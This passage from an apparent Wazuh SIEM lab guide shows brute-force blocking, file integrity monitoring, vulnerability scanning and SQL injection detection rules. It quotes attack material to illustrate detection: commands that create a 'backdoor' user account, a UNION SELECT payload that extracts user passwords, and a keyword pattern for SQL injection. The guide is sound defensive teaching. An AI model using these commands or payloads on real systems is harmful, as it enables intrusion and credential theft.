"rule": {
"id": "5712",
"level": 10, "description": "sshd: brute force trying to get access to the system.", "groups": ["syslog", "sshd", "authentication_failures"],
"mitre": {
"id": ["T1110.001"],
"tactic": ["Credential Access"], "technique": ["Brute Force: Password Guessing"]
}
},
"agent": {
"id": "002",
"name": "web-srv-01", "ip": "192.168.1.20"
},
"data": {
"srcip": "192.168.1.100",
"srcuser": "admin",
"dstuser": "admin",
"attempts": 8,
"location": "/var/log/auth.log"
}
}
Dashboard Visualization:
+-------------------------------------------------------------+
| CRITICAL ALERT | | Rule: 5712 — SSH Brute Force Attempt |
| Level: 10/15 (High) |
| Source IP: 192.168.1.100 (Kali Linux) |
| Target: web-srv-01 (192.168.1.20) |
| Attempts: 8 failed logins in 120 seconds | | MITRE ATT&CK: T1110.001 (Brute Force: Password Guessing) |
| Time: 2026-07-05 02:17:34 UTC |
+-------------------------------------------------------------+
5.5.4 Automated Incident Response: Active Response
Configuration — Auto-Block Brute-Force IPs:
Edit /var/ossec/etc/ossec.conf on the Wazuh Manager:
<ossec_config>
<command>
<name>firewall-drop</name>
<executable>firewall-drop.sh</executable> <timeout_allowed>yes</timeout_allowed>
</command>
<active-response>
<command>firewall-drop</command>
<location>local</location>
<rules_id>5712</rules_id>
<timeout>600</timeout>
</active-response>
</ossec_config>
What Happens:
1.	Rule 5712 fires when 8+ failed SSH attempts occur from the same IP
2.	Wazuh triggers firewall-drop.sh on the affected agent (web-srv-01)
3.	Script adds the attacker's IP to iptables DROP list
4.	IP is blocked for 600 seconds (10 minutes), then automatically removed
Verification on Web Server:
# Check iptables for the blocked IP sudo iptables -L INPUT -n -v | grep 192.168.1.100
# Output: Chain INPUT (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination 15 900 DROP all -- * * 192.168.1.100 0.0.0.0/0
# Confirm brute-force stops
# Hydra output: "[ERROR] target does not support password authentication"
Active Response Log (/var/ossec/logs/active-responses.log):
2026-07-05T02:17:35.123+0000 /var/ossec/active-response/bin/firewall-drop.sh add -
192.168.1.100 1712343455.123456 5712 2026-07-05T02:27:35.456+0000 /var/ossec/active-response/bin/firewall-drop.sh delete -
192.168.1.100 1712343455.123456 5712
5.5.5 File Integrity Monitoring (FIM) — Detecting Backdoors
Scenario: Attacker gains shell access and modifies /etc/passwd to create a backdoor user.
FIM Configuration (/var/ossec/etc/ossec.conf on Agent):
<syscheck>
<directories check_all="yes">/etc,/usr/bin,/usr/sbin</directories> <directories check_all="yes">/bin,/sbin,/boot</directories> <frequency>43200</frequency>
</syscheck>
Attack:
# Attacker adds backdoor user sudo useradd -m -s /bin/bash backdoor sudo passwd backdoor
# This modifies /etc/passwd and /etc/shadow
Wazuh FIM Alert (Rule 550 — Integrity Checksum Changed):
{ "timestamp": "2026-07-05T03:42:18.000Z",
"rule": {
"id": "550",
"level": 7,
"description": "Integrity checksum changed.", "groups": ["ossec", "syscheck", "syscheck_entry_modified"]
},
"syscheck": {
"path": "/etc/passwd",
"size_before": "2847",
"size_after": "2912",
"md5_before": "a1b2c3d4e5f6...",
"md5_after": "f6e5d4c3b2a1...",
"sha256_before": "abc123...",
"sha256_after": "xyz789...", "diff": "+backdoor:x:1001:1001::/home/backdoor:/bin/bash"
},
"agent": {
"name": "web-srv-01",
"ip": "192.168.1.20"
}
}
Analyst Action in Dashboard:
1.	Alert 550 fired: /etc/passwd modified on web-srv-01
2.	Diff shows new user "backdoor" added
3.	Cross-reference with authentication logs — no legitimate admin session
4.	Escalate to Incident Response Team
5.	Isolate web-srv-01 from network
6.	Remove backdoor user, restore /etc/passwd from backup
7.	Investigate initial compromise vector (likely the SQL injection above)
5.5.6 Vulnerability Detection
Wazuh Vulnerability Detector Configuration:
<vulnerability-detector>
<enabled>yes</enabled>
<interval>5m</interval> <min_full_scan_interval>6h</min_full_scan_interval>
<run_on_start>yes</run_on_start>
<provider name="canonical">
<enabled>yes</enabled>
<os>jammy</os> <update_interval>1h</update_interval>
</provider>
<provider name="nvd">
<enabled>yes</enabled>
<update_from_year>2010</update_from_year> <update_interval>1h</update_interval>
</provider>
</vulnerability-detector>
Sample Vulnerability Alert (CVE-2024-21683):
{ "timestamp": "2026-07-05T04:00:00.000Z",
"rule": {
"id": "23504",
"level": 7, "description": "CVE-2024-21683 affects python3-django"
},
"data": {
"vulnerability": { "cve": "CVE-2024-21683",
"package": {
"name": "python3-django",
"version": "3.2.12-2ubuntu1", "architecture": "amd64"
},
"severity": "High",
"cvss3_score": "7.5",
"condition": "Package less than 3.2.25-1ubuntu1",
"title": "SQL injection vulnerability in Django QuerySet.explain()",
"published": "2024-01-15", "updated": "2024-03-20"
}
},
"agent": { "name": "web-srv-01"
}
}
Remediation Workflow:
1.	Wazuh detects CVE-2024-21683 on web-srv-01 (Django SQL injection)
2.	Alert severity: HIGH (CVSS 7.5)
3.	Patch available: Upgrade to Django 3.2.25+
4.	Create ticket in Jira: "URGENT: Patch Django on web-srv-01"
5.	Schedule maintenance window
6.	Apply patch, verify with Wazuh re-scan
7.	Close ticket, document in change log
5.5.7 Custom Detection Rules: SQL Injection in Web Logs
Custom Rule (/var/ossec/etc/rules/local_rules.xml):
<group name="web,sql_injection">
<rule id="100001" level="10">
<if_sid>31100</if_sid>
<url> UNION | SELECT | INSERT | DELETE | DROP | OR 1=1 | SLEEP( | WAITFOR </url> <description>SQL Injection attempt detected in web request</description>
<mitre>
<id>T1190</id>
</mitre>
</rule>
<rule id="100002" level="12" frequency="3" timeframe="60"> <if_matched_sid>100001</if_matched_sid>
<same_source_ip /> <description>Multiple SQL Injection attempts from same source — Possible attack</description>
<mitre>
<id>T1190</id>
</mitre>
</rule>
</group>
Triggered Alert (Rule 100002):
{ "timestamp": "2026-07-05T02:18:45.000Z",
"rule": {
"id": "100002",
"level": 12, "description": "Multiple SQL Injection attempts from same source — Possible attack",
"frequency": 3, "timeframe": 60
},
"data": {
"srcip": "192.168.1.100", "url": "/api/products?id=1' UNION SELECT username,password,email FROM users--",
"http_method": "GET", "user_agent": "sqlmap/1.7.12#dev"
},
"agent": { "name": "web-srv-01"
}
}
5.5.8 Wazuh Dashboard: Threat Hunting Query
KQL Query for SQL Injection Activity:
rule.id: (100001 OR 100002) AND agent.name: web-srv-01
Dashboard Widget Output:
+--------------------------------------------------------------------+ | SQL Injection Attempts — Last 24 Hours |
| |
| Time Source IP Target URL Rule Level | | ---------------------------------------------------------------- |
| 02:18:45 192.168.1.100 /api/products?id=... 100002 12 |
| 02:18:42 192.168.1.100 /api/products?id=... 100001 10 |
| 02:18:39 192.168.1.100 /api/products?id=... 100001 10 | | 02:18:36 192.168.1.100 /api/products?id=... 100001 10 |
| |
| Total Attempts: 47 | Unique Payloads: 12 | Blocked: YES |
+--------------------------------------------------------------------+
5.5.9 Integration with Incident Response Playbook
Wazuh -> SOAR Integration Flow:
Wazuh Alert (Rule 100002: SQL Injection)
| Webhook to SOAR Platform (Shuffle / TheHive / Cortex)
| Automated Actions:
1.	Enrich IP with threat intelligence (AbuseIPDB, VirusTotal)
2.	Create incident ticket in TheHive (Severity: HIGH)
3.	Notify SOC team via Slack/Teams
4.	Trigger Active Response: Block source IP for 1 hour
5.	Capture packet dump on affected interface (tcpdump)
6.	Snapshot affected VM for forensic analysis
7.	Update firewall rules at perimeter (pfSense/OPNsense)
Slack Notification (Automated):
SECURITY ALERT — SQL Injection Detected

Target: web-srv-01 (192.168.1.20) Attacker: 192.168.1.100 (Kali Linux — Known Penetration Testing Distro)
Rule: 100002 — Multiple SQL Injection attempts Payload: /api/products?id=1' UNION SELECT username,password,email FROM users--
Severity: HIGH (Level 12) MITRE: T1190 (Exploit Public-Facing Application)
Actions Taken:
Source IP blocked via Active Response (600s)
Incident ticket #INC-2026-0705-001 created in TheHive Packet capture started: /var/captures/web-srv-01_20260705.pcap
Next Steps:
-> Review web application code for SQLi vulnerability
-> Check database logs for unauthorized data access
-> Verify no successful data exfiltration occurred

